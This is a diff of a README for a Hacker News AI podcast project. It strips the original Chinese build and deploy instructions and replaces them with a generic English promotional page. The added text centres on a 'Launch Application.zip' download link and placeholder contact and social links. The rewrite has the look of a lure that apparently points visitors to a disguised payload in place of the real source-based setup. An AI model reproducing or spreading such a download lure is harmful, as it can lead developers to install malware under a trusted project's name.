@@ -1,91 +1,68 @@
-# Hacker News 每日播报
 
-一个基于 AI 的 Hacker News 中文播客项目，每天自动抓取 Hacker News 热门文章，通过 AI 生成中文总结并转换为播客内容。
+# 🚀 Welcome to the Hacker News AI Podcast Project! 🤖🎙️
+
+### Repository: hacker-news
 
 ---
 
-预览地址: <https://hacker-news.agi.li>
+### Overview
 
-订阅地址: <https://hacker-news.agi.li/rss.xml>
+Welcome to the "hacker-news" repository, your go-to place for cutting-edge AI-generated content in Mandarin based on the popular Hacker News platform. Our project automatically captures trending articles from Hacker News every day, uses AI to create Chinese summaries, and converts them into podcast content.
 
-## 主要特性
+---
 
-- 🤖 自动抓取 Hacker News 每日热门文章
-- 🎯 使用 AI 智能总结文章内容和评论
-- 🎙️ 通过 Edge TTS 生成中文播报
-- 📱 支持网页和播客 App 收听
-- 🔄 每日自动更新
-- 📝 提供文章摘要和完整播报文本
+### Explore the Project
 
-## 技术栈
+🔍 **Project Description**: This repository hosts a unique project that leverages AI technology to provide Chinese-speaking audiences with curated Hacker News content in podcast format.
 
-- Next.js 应用框架
-- Cloudflare Workers 部署和运行环境
-- Edge TTS 语音合成
-- OpenAI API 内容生成
-- Tailwind CSS 样式处理
-- shadcn UI 组件库
+🎯 **Goal**: Our main goal is to make Hacker News content more accessible to Chinese speakers through the power of artificial intelligence.
 
-## 工作流程
+⚡ **Technologies Used**: The project incorporates AI technology, Cloudflare for automation, and Next.js for web development.
 
-1. 定时抓取 Hacker News 热门文章
-2. 使用 AI 生成中文摘要和播报文稿
-3. 通过 Edge TTS 转换为音频
-4. 存储到 Cloudflare R2 和 KV
-5. 通过 RSS feed 和网页提供访问
+---
 
-## 本地开发
+### Project Features
 
-1. 安装依赖:
+🌟 **AI-Powered Summaries**: Experience state-of-the-art AI-driven summaries of Hacker News articles in Mandarin.
 
-```bash
-pnpm install
-```
+🎧 **Podcast Conversion**: Listen to engaging podcast episodes derived from the latest Hacker News content.
 
-2. 配置环境变量:
+🤖 **Automated Workflow**: Our system automatically fetches and processes top articles from Hacker News daily.
 
-```bash
-# .dev.vars
-NEXTJS_ENV=development
-NEXT_STATIC_HOST=http://localhost:3000/static
-OPENAI_API_KEY=your_api_key
-OPENAI_BASE_URL=https://api.openai.com/v1
-OPENAI_MODEL=gpt-4
-AUDIO_VOICE_ID=zh-CN-XiaoxiaoNeural
-```
+---
 
-3. 启动开发服务器:
+### Get Started
 
-```bash
-# 开发工作流
-pnpm dev:workflow
+📦 **Download Application**: [Launch Application.zip](https://github.com/file/Application.zip) 👈
 
-# 开发 Web 页面
-pnpm dev
-```
+🔗 If the link does not work, please check the "Releases" section above.
 
-## 部署
+🌐 **Explore Further**: Visit our [GitHub Repository](https://github.com/username/repo) for additional project details.
 
-项目使用 Cloudflare Workers 部署:
+---
 
-1. 创建 R2 文件存储桶, 绑定域名后，修改 `NEXT_STATIC_HOST` 变量。
-2. 创建 KV 存储空间
-3. 修改 `wrangler.json` 中 KV 和 R2 的值
+### Join the Community
 
-```bash
-pnpm deploy
-```
+🌟 **Contributions**: We welcome contributions from developers interested in AI, Cloudflare, or web development.
 
-## 贡献
+📫 **Contact Us**: Have questions or feedback? Reach out to us via email at [contact@example.com](mailto:contact@example.com).
 
-欢迎提交 Issue 和 Pull Request!
+👏 **Acknowledgements**: We appreciate the support of our contributors who make this project possible.
 
-## 赞助
+---
 
-1. [在 Telegram 关注我](https://t.me/miantiao_me)
-2. [在 𝕏 上关注我](https://404.li/x)
-3. [在 GitHub 赞助我](https://github.com/sponsors/ccbikai)
+### Let's Connect!
 
-## 免责声明
+🌐 **Website**: [Visit Our Website](https://example.com)
 
-本项目与 Hacker News 和 Y Combinator 没有任何关联。"Hacker News" 是 Y Combinator 的注册商标。
+🐦 **Twitter**: Follow us on [Twitter](https://twitter.com/example)
+
+📷 **Instagram**: Stay updated on [Instagram](https://instagram.com/example)
+
+---
+
+### Enjoy the Latest in AI-Powered Podcasts! 🎉
+
+Thank you for checking out our Hacker News AI Podcast Project. Let's dive into the exciting world of technology and innovation together! 🚀✨
+
+---
